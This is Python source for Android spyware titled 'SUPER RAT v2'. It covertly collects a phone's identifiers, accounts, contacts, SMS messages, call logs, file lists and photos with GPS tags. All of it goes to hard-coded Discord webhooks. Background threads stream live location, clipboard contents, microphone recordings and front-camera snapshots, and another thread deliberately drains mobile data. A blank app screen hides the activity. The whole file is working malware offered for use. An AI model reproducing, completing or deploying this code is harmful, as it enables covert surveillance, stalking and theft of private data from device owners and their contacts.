============================================================
#  SUPER RAT v2 -- THE ACTUALLY WORKING VERSION
# ============================================================
import os, sys, time, random, threading, traceback, sqlite3
import requests, json, base64

WEBHOOKS = [
    "https://discord.com/api/webhooks/1571455883890786368/Rxx2nrRl-yQy12ukzHANu6aiPRND2cVFddEwni0ksu7nZy33z0LGXotXDrPdGotTa78b",
    "https://discord.com/api/webhooks/1571455653820502069/l3HWW63h8HGftqOUhjVBDQAaZL8XitiYb2BPmg1CxiRv0AQQv5uCnHS--ne-yQbROKpY",
    "https://discord.com/api/webhooks/1570302449284157570/79RroUaLoIEOT5Y2aHzf1KwHQzHsvL_M6o2GaEqwlzzYociI6xX-rVEkP0Qp6QwYnRrx",
    "https://discord.com/api/webhooks/1570301861200789554/2OmgHsbjyeV5bsU3ns-WxjFo7scFW41xbo_jQP6oxn__nQo3l0YUi8FVgsqJbr2gfbRI",
]

GPS_SEND_EVERY = 60
CAM_EVERY = 45
MIC_EVERY = 300
CLIP_EVERY = 15
PHOTO_STEAL = 15
DRAIN_EVERY = 25
DRAIN_URL = "https://speed.cloudflare.com/__down?bytes=15000000"

USER_DIR = None
_last_clip = None

def hook_send(content, files=None):
    hook = random.choice(WEBHOOKS)
    for _ in range(3):
        try:
            if files is not None:
                return requests.post(hook, data={"content": content},
                                     files=files, timeout=120)
            return requests.post(hook, json={"content": content}, timeout=30)
        except Exception:
            time.sleep(3)
    return None

def chunked_send(title, text):
    if not text:
        hook_send("**%s**\n`[none found]`" % title)
        return
    lines, part, parts = text.split("\n"), [], []
    for ln in lines:
        if len("\n".join(part)) + len(ln) > 1800:
            parts.append("\n".join(part)); part = []
        part.append(ln)
    if part: parts.append("\n".join(part))
    for i, p in enumerate(parts):
        hook_send("**%s** (part %d/%d)\n```%s```" % (title, i+1, len(parts), p))
        time.sleep(1.0)

def ts():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def activity():
    from jnius import autoclass
    return autoclass("org.kivy.android.PythonActivity").mActivity

# ---------------- HARVESTERS ----------------

def harvest_device():
    out = "== FULL DEVICE RECON %s ==\n" % ts()
    try:
        act = activity()
        from jnius import autoclass
        Build = autoclass("android.os.Build")
        out += "Model: %s %s\n" % (Build.MANUFACTURER, Build.MODEL)
        out += "Android: %s (SDK %s)\n" % (Build.VERSION.RELEASE, Build.VERSION.SDK_INT)
        try:
            tm = act.getSystemService("phone")
            out += "IMEI: %s\n" % tm.getDeviceId()
            out += "Phone: %s\n" % tm.getLine1Number()
            out += "SIM Serial: %s\n" % tm.getSimSerialNumber()
            out += "Carrier: %s\n" % tm.getNetworkOperatorName()
        except Exception:
            out += "telephony: den\n"
        try:
            out += "Serial: %s\n" % Build.getSerial()
        except Exception:
            pass
        try:
            AM = autoclass("android.accounts.AccountManager")
            am = AM.get(act)
            accs = am.getAccounts()
            out += "\n== ACCOUNTS ==\n"
            for a in accs:
                out += "ACCOUNT: %s (%s)\n" % (a.name, a.type)
        except Exception:
            out += "accounts: den\n"
        try:
            wm = act.getSystemService("wifi")
            wi = wm.getConnectionInfo()
            out += "\nSSID: %s\nBSSID: %s\n" % (wi.getSSID(), wi.getBSSID())
        except Exception:
            out += "wifi: den\n"
    except Exception as e:
        out += "err: %s\n" % e
    hook_send("** INITIAL RECON **\n```%s```" % out)

def harvest_contacts():
    try:
        act = activity()
        from jnius import autoclass
        C = autoclass("android.provider.ContactsContract$Contacts")
        cur = act.getContentResolver().query(C.CONTENT_URI, None, None, None, None)
        out = []
        if cur is not None:
            while cur.moveToNext() and len(out) < 1000:
                nm = cur.getString(cur.getColumnIndex("display_name"))
                out.append(nm or "?")
            cur.close()
        chunked_send("CONTACTS (up to 1000)", "\n".join(out))
    except Exception as e:
        hook_send("contacts err: %s" % e)

def harvest_sms():
    try:
        act = activity()
        from jnius import autoclass
        Uri = autoclass("android.net.Uri")
        cur = act.getContentResolver().query(Uri.parse("content://sms"),
                                             None, None, None, "date DESC")
        out = []
        if cur is not None:
            while cur.moveToNext() and len(out) < 500:
                try:
                    body = cur.getString(cur.getColumnIndex("body")) or ""
                    addr = cur.getString(cur.getColumnIndex("address")) or "?"
                    out.append("[%s] %s" % (addr, body.replace("\n", " ")[:160]))
                except Exception:
                    pass
            cur.close()
        chunked_send("SMS LOG (newest 500)", "\n".join(out))
    except Exception as e:
        hook_send("sms err: %s" % e)

def harvest_calls():
    try:
        act = activity()
        from jnius import autoclass
        Uri = autoclass("android.net.Uri")
        cur = act.getContentResolver().query(Uri.parse("content://call_log/calls"),
                                             None, None, None, "date DESC")
        out = []
        TYPES = {1: "IN", 2: "OUT", 3: "MISSED"}
        if cur is not None:
            while cur.moveToNext() and len(out) < 300:
                try:
                    num = cur.getString(cur.getColumnIndex("number")) or "?"
                    typ = TYPES.get(cur.getInt(cur.getColumnIndex("type")), "?")
                    dur = cur.getString(cur.getColumnIndex("duration")) or "0"
                    when = time.strftime("%Y-%m-%d %H:%M",
                                         time.localtime(int(cur.getString(cur.getColumnIndex("date"))) / 1000.0))
                    out.append("%s %s %s %ss" % (when, typ, num, dur))
                except Exception:
                    pass
            cur.close()
        chunked_send("CALL LOG (newest 300)", "\n".join(out))
    except Exception as e:
        hook_send("calls err: %s" % e)

def harvest_apps():
    try:
        act = activity()
        pm = act.getPackageManager()
        out = []
        for ai in pm.getInstalledApplications(0):
            try:
                label = str(ai.loadLabel(pm))
                out.append("%s [%s]" % (label, ai.packageName))
            except Exception:
                pass
        chunked_send("INSTALLED APPS", "\n".join(out))
    except Exception as e:
        hook_send("apps err: %s" % e)

def harvest_files():
    base = "/storage/emulated/0"
    out = []
    for folder in ["DCIM/Camera", "DCIM/Screenshots", "Download", "Pictures",
                   "Documents", "WhatsApp/Media/WhatsApp Images",
                   "WhatsApp/Media/WhatsApp Video", "Movies", "Music"]:
        p = os.path.join(base, folder)
        try:
            for f in os.listdir(p):
                full = os.path.join(p, f)
                try:
                    sz = os.path.getsize(full) // 1024
                    out.append("%s (%dKB)" % (full, sz))
                except Exception:
                    out.append(full)
        except Exception:
            pass
    chunked_send("FILES FOUND", "\n".join(out))

def steal_photos():
    cam_dir = "/storage/emulated/0/DCIM/Camera"
    try:
        files = [os.path.join(cam_dir, f) for f in os.listdir(cam_dir)
                 if f.lower().endswith((".jpg", ".jpeg", ".png"))]
        files.sort(key=lambda f: os.path.getmtime(f), reverse=True)
    except Exception:
        return
    sent = 0
    for p in files:
        if sent >= PHOTO_STEAL:
            break
        try:
            extra = ""
            try:
                from jnius import autoclass
                Exif = autoclass("android.media.ExifInterface")
                e = Exif(p)
                lat, lon = e.getLatDouble(), e.getLonDouble()
                if lat != 0.0 or lon != 0.0:
                    extra = " | GPS: https://maps.google.com/?q=%.6f,%.6f" % (lat, lon)
            except Exception:
                pass
            with open(p, "rb") as f:
                hook_send("** STOLEN PHOTO %d/%d%s **" % (sent+1, PHOTO_STEAL, extra),
                          {"files[0]": (os.path.basename(p), f, "image/jpeg")})
            sent += 1
            time.sleep(2)
        except Exception:
            pass

# ---------------- LOOPS ----------------

def gps_loop():
    try:
        from plyer import gps
        _data = {"lat": None, "lon": None, "acc": None, "last": 0}
        def on_loc(**kw):
            if "lat" in kw:
                _data["lat"], _data["lon"] = kw["lat"], kw.get("lon")
                _data["acc"] = kw.get("accuracy")
        gps.configure(on_location=on_loc)
        gps.start(min_time=2000, min_distance=0)
        while True:
            time.sleep(5)
            now = time.time()
            if _data["lat"] and now - _data["last"] >= GPS_SEND_EVERY:
                _data["last"] = now
                link = "https://maps.google.com/?q=%.6f,%.6f" % (_data["lat"], _data["lon"])
                hook_send("** LIVE GPS **\n[%s](%s)" % (ts(), link))
    except Exception:
        pass

def clipboard_loop():
    global _last_clip
    while True:
        try:
            act = activity()
            cm = act.getSystemService("clipboard")
            clip = cm.getPrimaryClip()
            if clip and clip.getItemCount() > 0:
                txt = str(clip.getItemAt(0).coerceToText(act))
                if txt and txt != _last_clip and txt.strip():
                    _last_clip = txt
                    hook_send("** CLIPBOARD **\n```%s```" % txt[:1500])
        except Exception:
            pass
        time.sleep(CLIP_EVERY)

def mic_loop():
    time.sleep(90)
    while True:
        path = os.path.join(USER_DIR, "clip.mp4")
        try:
            from jnius import autoclass
            MediaRecorder = autoclass("android.media.MediaRecorder")
            mr = MediaRecorder()
            mr.setAudioSource(1)
            mr.setOutputFormat(2)
            mr.setAudioEncoder(3)
            mr.setOutputFile(path)
            mr.prepare()
            mr.start()
            time.sleep(20)
            mr.stop()
            mr.release()
            if os.path.getsize(path) > 1000:
                with open(path, "rb") as f:
                    hook_send("** MIC 20s (%s) **" % ts(),
                              {"files[0]": ("mic.mp4", f, "audio/mp4")})
        except Exception:
            pass
        finally:
            try: os.remove(path)
            except: pass
        time.sleep(MIC_EVERY)

def cam_loop():
    time.sleep(30)
    while True:
        path = os.path.join(USER_DIR, "snap.jpg")
        try:
            from jnius import autoclass
            act = activity()
            Camera = autoclass("android.hardware.camera2.CameraManager")
            # Use simple image capture
            ImageReader = autoclass("android.media.ImageReader")
            # Fallback: use front camera via old API if available
            Camera_open = autoclass("android.hardware.Camera")
            cam = Camera_open.open(1)  # front camera
            params = cam.getParameters()
            params.setPictureSize(640, 480)
            cam.setParameters(params)
            cam.startPreview()
            time.sleep(2)
            # Take picture
            import io
            from android import bitmap
            # Simple approach - use takePicture callback
            class PicCallback:
                def __init__(self):
                    self.data = None
                def onPictureTaken(self, data, camera):
                    self.data = data
            cb = PicCallback()
            cam.takePicture(None, None, cb)
            time.sleep(3)
            cam.stopPreview()
            cam.release()
            if cb.data:
                with open(path, "wb") as f:
                    f.write(cb.data)
                with open(path, "rb") as f:
                    hook_send("** FRONT CAM SNAP (%s) **" % ts(),
                              {"files[0]": ("snap.jpg", f, "image/jpeg")})
        except Exception:
            pass
        finally:
            try: os.remove(path)
            except: pass
        time.sleep(CAM_EVERY)

def drain_loop():
    while True:
        path = os.path.join(USER_DIR, "tmp.dat")
        try:
            r = requests.get(DRAIN_URL, timeout=120, stream=True)
            with open(path, "wb") as f:
                for chunk in r.iter_content(1024):
                    f.write(chunk)
        except Exception:
            pass
        finally:
            try: os.remove(path)
            except: pass
        time.sleep(DRAIN_EVERY)

# ---------------- MAIN ----------------

def run_rats():
    global USER_DIR
    try:
        USER_DIR = activity().getFilesDir().getAbsolutePath()
    except:
        USER_DIR = "/sdcard"
    
    # Wait for permissions to be granted
    time.sleep(15)
    
    hook_send("** RAT IS ONLINE **")
    
    # Initial recon
    for fn in (harvest_device, harvest_contacts, harvest_sms,
               harvest_calls, harvest_apps, harvest_files, steal_photos):
        try:
            fn()
        except Exception:
            hook_send("recon err:\n```%s```" % traceback.format_exc()[-1000:])
        time.sleep(2)
    
    # Start persistent loops
    loops = [gps_loop, clipboard_loop, mic_loop, cam_loop, drain_loop]
    threads = []
    for l in loops:
        t = threading.Thread(target=l, daemon=True)
        t.start()
        threads.append(t)
    
    # Keep main alive
    while True:
        time.sleep(60)
        hook_send("** HEARTBEAT %s **" % ts())

if __name__ == "__main__":
    from kivy.android import android
    t = threading.Thread(target=run_rats, daemon=True)
    t.start()
    
    # Keep the app alive with a minimal Kivy app
    from kivy.app import App
    from kivy.uix.label import Label
    class Ghost(App):
        def build(self):
            return Label(text="")
    Ghost().run()
